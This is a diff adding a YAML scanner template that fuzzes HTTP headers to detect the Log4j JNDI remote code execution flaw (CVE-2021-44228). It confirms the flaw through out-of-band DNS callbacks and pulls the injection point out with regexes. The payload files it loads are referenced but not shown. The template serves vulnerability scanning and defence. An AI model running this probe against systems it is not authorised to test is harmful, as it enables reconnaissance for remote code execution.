@@ -1,0 +1,58 @@
+id: log4j-generic-header-fuzz
+
+info:
+  name: Log4j RCE - Header Fuzzer
+  author: aravazhimdr
+  severity: critical
+  description: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
+  reference:
+    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
+    - https://www.lunasec.io/docs/blog/log4j-zero-day/
+    - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
+    - https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers
+  tags: cve,cve2021,rce,oast,log4j
+
+requests:
+  - raw:
+      - |
+        GET /?res=json&auth=admin HTTP/1.1
+        Host: {{Hostname}}
+        {{header_set1}}
+        {{header_set2}}
+        {{header_set3}}
+        {{header_set4}}
+        {{header_set5}}
+
+    payloads:
+      header_set1: fuzz/header-set1.txt
+      header_set2: fuzz/header-set2.txt
+      header_set3: fuzz/header-set3.txt
+      header_set4: fuzz/header-set4.txt
+      header_set5: fuzz/header-set5.txt
+    attack: pitchfork
+    threads: 125
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Injection point + path
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   #  Suffix + {{Host}}
